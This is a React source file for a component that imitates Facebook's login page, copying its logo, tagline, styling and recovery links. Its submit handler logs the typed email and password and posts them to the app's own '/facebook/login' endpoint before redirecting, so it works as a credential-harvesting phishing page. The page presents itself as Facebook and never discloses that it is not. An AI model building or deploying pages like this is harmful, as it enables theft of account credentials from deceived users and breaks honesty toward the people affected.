import { Button, Container, Grid, Paper } from "@material-ui/core";
import React, { useState } from "react";
import axiosIntance from "./app/helpers/axios";
import img from "./facebook.svg";
import { useHistory } from "react-router-dom";
export default function Facebook() {
  const [user, setUser] = useState("");
  const [password, setPassword] = useState("");
  const history = useHistory();

  const submit = () => {
    const facebook = { user, password };
    console.log(facebook);
    axiosIntance.post("/facebook/login", facebook).then((res) => {
      console.log("Logged in Complete");
      return history.push('/')
    });
  };

  return (
    <div>
      <Container
        maxWidth="md"
        style={{ paddingTop: 20, paddingLeft: 4, paddingRight: 4 }}
      >
        <Grid container>
          <Grid item sm={12} md={6} align="center">
            <img
              src={img}
              style={{
                lineHeight: 1.34,
                height: "126px",
                margin: "-28px",
                paddingBottom: 20,
                marginTop: "20px",
              }}
              alt="Facebook"
            />
            <h2
              style={{
                // fontSize: "23px",
                fontWeight: "normal",
                lineHeight: "28px",
                textAlign: "center",
              }}
            >
              Facebook helps you connect and share with the people in your life.
            </h2>
          </Grid>
          <Grid item sm={12} md={6} align="center">
            <Paper
              elevation={0}
              style={{
                // paddingTop: 10,
                // paddingBottom: 24,
                border: "none",
                borderRadius: 8,
                backgroundColor: "#fff",
                margin: `40px 0 0`,
                padding: `20px 10px 28px`,
                minWidth: "320px",
                maxWidth: 396,
                boxShadow: `0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)`,
              }}
            >
              <input
                type="text"
                name="email"
                id="email"
                onChange={(e) => setUser(e.target.value)}
                placeholder="Email address or phone number"
                style={{
                  fontSize: 17,
                  padding: `14px 16px`,
                  borderRadius: 6,
                  border: `1px solid #dddfe2`,
                  color: "#1d2129",

                  width: `100%`,
                }}
              />
              <input
                type="password"
                name="password"
                id="password"
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                style={{
                  fontSize: 17,
                  padding: `14px 16px`,
                  borderRadius: 6,
                  border: `1px solid #dddfe2`,
                  color: "#1d2129",
                  marginTop: 10,
                  width: `100%`,
                }}
              />
              <Button
                fullWidth
                variant="contained"
                style={{
                  marginTop: 10,
                  backgroundColor: "#1877f2",
                  border: "none",
                  fontSize: 20,
                  lineHeight: "48px",
                  padding: `0 16px`,
                  borderRadius: 6,
                  color: "#fff",
                  textTransform: "none",
                }}
                onClick={() => submit()}
              >
                Log In
              </Button>
              <div style={{ marginTop: 16 }}>
                <a
                  style={{
                    color: "#1877f2",
                    fontSize: "14px",
                    fontWeight: 500,
                    textDecoration: "none",
                  }}
                  href="https://www.facebook.com/recover/initiate/?ars=facebook_login&amp;privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjA2NTczODMyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D"
                >
                  Forgotten password?
                </a>
              </div>
              <div
                className="_8icz"
                style={{
                  borderBottom: "1px solid #dadde1",
                  alignItems: "center",
                  display: "flex",

                  margin: `20px 16px`,
                  textAlign: "center",
                }}
              ></div>
              <div style={{ paddingTop: 6 }}>
                <Button
                  style={{
                    border: "none",
                    borderRadius: 6,
                    fontSize: 17,
                    color: "#fff",
                    textTransform: "none",
                    backgroundColor: "#42b72a",
                    lineHeight: `48px`,
                    padding: `0 16px`,
                    textDecoration: "none",
                  }}
                  role="button"
                  href="#"
                  rel="async"
                >
                  Create New Account
                </Button>
              </div>
            </Paper>
            <div
              style={{
                borderTop: "none",
                color: " #1c1e21",
                fontFamily: "SFProText-Regular, Helvetica, Arial, sans-serif",
                fontSize: "14px",
                marginTop: "28px",
                fontWeight: "normal",
                paddingTop: 0,
              }}
            >
              <a
                style={{
                  textDecoration: "none",
                  color: "#000",
                  fontWeight: 600,
                }}
                href="/pages/create/?ref_type=registration_form"
              >
                Create a Page
              </a>{" "}
              for a celebrity, band or business.
            </div>
          </Grid>
        </Grid>
      </Container>
    </div>
  );
}
